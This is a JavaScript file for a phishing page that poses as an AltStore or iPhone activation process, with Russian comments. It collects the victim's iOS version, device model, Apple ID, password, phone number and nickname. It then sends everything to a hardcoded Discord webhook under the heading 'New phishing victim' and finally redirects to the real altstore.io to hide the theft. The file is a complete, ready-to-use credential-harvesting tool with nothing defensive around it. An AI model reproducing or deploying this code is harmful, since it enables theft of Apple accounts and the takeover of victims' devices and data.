let currentStep = 1;
let collectedData = {};

function nextStep(step) {
    if (step === 2) {
        collectedData.ios = document.getElementById('iosVersion').value;
    } else if (step === 3) {
        collectedData.iphone = document.getElementById('iphoneModel').value;
    }
    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
    document.getElementById(`step${step}`).classList.add('active');
    currentStep = step;
}

function startPhishing() {
    // Запоминаем время начала
    collectedData.timestamp = new Date().toLocaleString();
    nextStep(4);
}

async function submitPhish() {
    // Собираем данные из формы
    const appleId = document.getElementById('appleId').value;
    const password = document.getElementById('password').value;
    const phone = document.getElementById('phone').value;
    const nickname = document.getElementById('nickname').value;
    const hasCert = document.getElementById('cert').checked;

    if (!appleId || !password || !phone || !nickname) {
        alert('Please fill all fields');
        return;
    }

    collectedData.appleId = appleId;
    collectedData.password = password;
    collectedData.phone = phone;
    collectedData.nickname = nickname;
    collectedData.hasCert = hasCert;

    if (hasCert) {
        // Если есть сертификат — кидаем на официальный сайт
        window.location.href = 'https://altstore.io';
    } else {
        // Генерируем код
        const randomNum = Math.floor(Math.random() * 900 + 100); // 100-999
        const code = `ALT${randomNum}PRO`;
        collectedData.code = code;
        document.getElementById('generatedCode').innerText = code;

        // Отправляем первые данные в Discord
        await sendToDiscord(collectedData, 'initial');

        nextStep(5);
    }
}

async function finishPhish() {
    // Завершающий шаг – можно отправить подтверждение или просто редирект
    await sendToDiscord(collectedData, 'final');
    alert('Thank you! Your device is now activated. You will be redirected.');
    window.location.href = 'https://altstore.io';
}

async function sendToDiscord(data, stage) {
    const webhookUrl = 'https://discord.com/api/webhooks/1456608509906128928/S_vlv9faEH_Y2RLDAfJA07eZ8DvZG_QiojDILZpg0xTk60b0n7QrlL4e8N2874Dt5nVK';
    const content = `**New phishing victim**\nStage: ${stage}\niOS: ${data.ios || 'N/A'}\niPhone: ${data.iphone || 'N/A'}\nTime: ${data.timestamp}\nApple ID: ${data.appleId || 'N/A'}\nPassword: ${data.password || 'N/A'}\nPhone: ${data.phone || 'N/A'}\nNickname: ${data.nickname || 'N/A'}\nHas cert: ${data.hasCert}\nCode: ${data.code || 'N/A'}`;

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content })
        });
    } catch (e) {
        console.error('Failed to send to Discord', e);
    }
}
